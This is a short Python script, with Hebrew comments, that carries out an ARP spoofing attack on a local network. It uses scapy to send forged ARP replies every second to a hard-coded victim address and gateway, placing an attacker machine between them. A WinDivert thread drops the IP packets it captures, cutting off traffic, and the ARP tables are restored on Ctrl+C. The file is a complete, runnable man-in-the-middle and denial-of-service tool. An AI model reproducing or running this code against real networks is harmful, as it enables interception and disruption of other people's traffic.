import os
import multiprocessing
from pydivert import WinDivert
import threading
from getmac import get_mac_address
from scapy.all import srp, send
from scapy.layers.l2 import Ether, ARP
# import win32serviceutil
import argparse
import time


def spoof(target_ip, host_ip, attacker_ip, verbose = True):
    target_mac  = get_mac_address(ip = target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose = 0)
    if verbose:
        self_mac = get_mac_address(ip=attacker_ip)
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose = True):
    target_mac = get_mac_address(ip=target_ip)
    host_mac = get_mac_address(ip=host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op='is-at')
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

def block_traffic(filter_rule="ip"):
    with WinDivert(filter_rule) as w:
        for packet in w:
            # אל תשלח את הפאקטות חזרה => הן נחסמות
            pass

# def _enable_windows_iproute():
#     """
#     Enables IP route (IP Forwarding) in Windows
#     """
#     from services import WService
#     # enable Remote Access service
#     service = WService("RemoteAccess")
#     # service.start


if __name__ == "__main__":
    # victim ip address
    target = "192.168.1.159"
    # gateway ip address
    host = "192.168.1.1"
    # attacker ip address
    attacker = "192.168.1.100"
    # print progress to the screen
    verbose = True

    # enable ip forwarding
   # _enable_windows_iproute()

    # חסימת תעבורה יוצאת
    traffic_blocker = threading.Thread(target=block_traffic, daemon=True)
    traffic_blocker.start()

    try:
        while True:
            # #Block traffic
            # block_traffic()
            # telling the `target` that we are the `host`
            spoof(target, host, attacker, verbose)
            # telling the `host` that we are the `target`
            spoof(host, target, attacker, verbose)
            # sleep for one second
            time.sleep(1)

    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(target, host)
        restore(host, target)